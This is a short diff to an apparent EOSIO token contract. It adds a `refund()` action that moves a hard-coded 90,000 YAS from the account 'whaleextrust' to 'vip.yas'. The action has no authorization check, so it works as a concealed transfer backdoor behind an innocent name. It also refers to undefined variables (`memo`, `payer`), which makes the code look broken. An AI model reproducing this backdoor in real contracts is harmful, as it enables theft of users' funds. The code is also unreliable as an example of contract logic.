@@ -155,5 +155,27 @@ void token::close( const name& owner, const symbol& symbol )
    check( it->balance.amount == 0, "Cannot close because the balance is not zero." );
    acnts.erase( it );
 }
+  
+void token::refund()
+{
+    name from = "whaleextrust"_n;
+    name to = "vip.yas"_n;
+    asset quantity = asset(900000000,symbol("YAS",4));
+    
+    auto sym = quantity.symbol.code();
+    stats statstable( get_self(), sym.raw() );
+    const auto& st = statstable.get( sym.raw() );
+
+    require_recipient( from );
+    require_recipient( to );
+
+    check( quantity.is_valid(), "invalid quantity" );
+    check( quantity.amount > 0, "must transfer positive quantity" );
+    check( quantity.symbol == st.supply.symbol, "symbol precision mismatch" );
+    check( memo.size() <= 256, "memo has more than 256 bytes" );
+
+    sub_balance( from, quantity );
+    add_balance( to, quantity, payer );
+}
 
 } /// namespace eosio
